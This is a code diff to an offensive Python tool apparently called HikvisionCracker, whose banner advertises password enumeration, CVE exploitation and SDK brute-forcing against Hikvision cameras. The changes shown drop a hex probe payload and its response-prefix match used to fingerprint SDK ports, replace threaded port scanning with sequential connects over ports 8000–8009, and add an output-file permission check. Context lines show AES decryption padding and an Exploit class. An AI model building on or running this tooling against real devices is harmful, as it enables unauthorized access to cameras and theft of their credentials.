@@ -6,6 +6,7 @@ import re
 import os
 import sys
 import socket
+import tempfile
 import threading
 import queue
 import time
@@ -39,10 +40,9 @@ LOGO = '''
 ⠀⢸⣿⣴⠶⠞⠛⠉⠁⠀<Web Password Enumeration | CVE Exploitation | SDK Brute-Forcing>
 ⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀'''
 
-HEX_DATA = "0000002063000000119706d5001110c26800a8c025801157cc28aa16edda0000"
-MATCH_PREFIX = "000000c4"
+ 
 DEFAULT_SDK_PORT = 8000
-SDK_PORT_SCAN_RANGE = range(8000, 8101)
+SDK_PORT_SCAN_RANGE = range(8000, 8010)
 SCAN_TIMEOUT = 1
 REQUEST_TIMEOUT = 3
 DEFAULT_HTTP_PORT = 80
@@ -164,34 +164,22 @@ class HikvisionCracker:
         """Validate if IP format is valid"""
         pattern = re.compile(r'^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(25[0-5]|2[0-4]\d|[01]?\d\d?)$')
         return bool(pattern.match(ip))
-
+ 
     def scan_single_ip_sdk_port(self, ip: str, port: int) -> int:
         """Scan specified SDK port for single IP"""
         if ip in self.open_sdk_ports:
             return None
-        
-        try:
-            payload = bytes.fromhex(HEX_DATA)
-        except ValueError as e:
-            with self.print_lock:
-                print(f"{ERROR}[!] [SDK] [{ip}:{port}] Hex data conversion failed: {str(e)[:30]}{RESET}")
-            return None
-
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.settimeout(SCAN_TIMEOUT)
                 s.connect((ip, port))
-                s.sendall(payload)
-                resp = s.recv(4096)
-                
-                if resp and resp.hex().startswith(MATCH_PREFIX):
-                    with self.result_lock:
-                        self.open_sdk_ports[ip] = port
-                    with self.print_lock:
-                        print(f"{SUCCESS}[+] [SDK] [{ip}:{port}]{RESET}")
-                    return port
+                with self.result_lock:
+                    self.open_sdk_ports[ip] = port
+                with self.print_lock:
+                    print(f"{SUCCESS}[+] [SDK] [{ip}:{port}]{RESET}")
+                return port
         except (socket.timeout, ConnectionRefusedError, OSError, ConnectionError):
-            pass
+            return None
         except Exception as e:
             with self.print_lock:
                 print(f"{ERROR}[!] [SDK] [{ip}:{port}] Scan exception: {str(e)[:30]}{RESET}")
@@ -200,47 +188,27 @@ class HikvisionCracker:
     def batch_brute_sdk_ports(self, ip_list: list, max_workers: int) -> None:
         """Batch brute-force SDK ports for cracked IPs"""
         with self.print_lock:
-            print(f"{INFO}[*] Start scanning SDK ports (Range: {SDK_PORT_SCAN_RANGE.start}-{SDK_PORT_SCAN_RANGE.stop-1})...{RESET}")
- 
+            print(f"{INFO}[*] [SDK] Starting SDK port scanning...{RESET}")
+    
         for ip in ip_list:
             if not self.validate_ip(ip):
                 with self.print_lock:
-                    print(f"{ERROR}[!] [SDK] Invalid IP format: {ip}, skipped{RESET}")
+                    print(f"{ERROR}[!] [SDK] [{ip}] Invalid IP format , skipped{RESET}")
                 continue
-            
             ip_has_open_port = False  
-            ports_to_scan = list(SDK_PORT_SCAN_RANGE)
-            ports_to_scan.insert(0, DEFAULT_SDK_PORT)
-            ports_to_scan = sorted(list(set(ports_to_scan)))
-            
-            thread_num = min(max_workers, len(ports_to_scan))
-            with ThreadPoolExecutor(max_workers=thread_num) as executor:
-                future_map = {}
-                for port in ports_to_scan:
-                    if ip in self.open_sdk_ports:
-                        break
-                    future = executor.submit(self.scan_single_ip_sdk_port, ip, port)
-                    future_map[future] = port
-                
-                for future in as_completed(future_map):
-                    port = future_map[future]
-                    try:
-                        result = future.result()
-                        if result is not None:
-                            ip_has_open_port = True
-                            for remaining_future in future_map:
-                                if not remaining_future.done():
-                                    remaining_future.cancel()
-                            break
-                    except CancelledError:
-                        pass
-                    except Exception as e:
-                        with self.print_lock:
-                            print(f"{ERROR}[!] [SDK] [{ip}:{port}] Scan exception: {str(e)[:30]}{RESET}")
-            
+            ports_to_scan = list(SDK_PORT_SCAN_RANGE)  
+            with self.print_lock:
+                print(f"{INFO}[*] [SDK] [{ip}] Scanning SDK ports ...{RESET}")
+            for port in ports_to_scan:
+                if ip in self.open_sdk_ports:
+                    break
+                result = self.scan_single_ip_sdk_port(ip, port)
+                if result is not None:
+                    ip_has_open_port = True
+                    break
             if not ip_has_open_port:
                 with self.print_lock:
-                    print(f"{ERROR}[!] [SDK] {ip} No open SDK ports found (Range 8000-8099){RESET}")
+                    print(f"{ERROR}[!] [SDK] [{ip}] No open SDK ports found{RESET}")
 
     def add_to_16(self, s: bytes) -> bytes:
         """AES decryption padding: make up to 16 bytes"""
@@ -649,10 +617,13 @@ class Exploit:
         self,
         ips,
         threads=10,
-        output_type="json",
-        output_path="./result.json"
-    ):
+        output_type="csv",
+        output_path="./result.csv"
+    ):  
         print(LOGO)
+        if not self.check_write_permission(output_path):
+            print(f"{ERROR}[!] File is not writable (may be in use), please change the file name or path....{RESET}")
+            return
         cracker = HikvisionCracker()
         ip_list = []
         if isinstance(ips, str) and os.path.isfile(ips):
@@ -724,3 +695,35 @@ class Exploit:
             cracker.save_to_json(output_path)
 
         print(f"{INFO}[*] Done! Exported {len(cracker.final_results)} devices in total{RESET}")
+    def check_write_permission(self,output_path:str) -> bool:
+        try:
+            dir_path = os.path.dirname(output_path)
+            file_name = os.path.basename(output_path)
+
+            if not dir_path:
+                dir_path = os.getcwd()  
+        
+            if not os.path.exists(dir_path):
+                try:
+                    os.makedirs(dir_path, exist_ok=True)
+                except (PermissionError, OSError) as e:
+                    return False
+            
+            try:
+                with tempfile.NamedTemporaryFile(
+                    mode='w', 
+                    dir=dir_path, 
+                    delete=True  
+                ):
+                    pass
+            except (PermissionError, OSError) as e:
+                return False
+            if os.path.exists(output_path):
+                try:
+                    with open(output_path, 'a') as f:
+                        pass
+                except (PermissionError, OSError) as e:
+                    return False
+            return True
+        except Exception as e:
+            return False
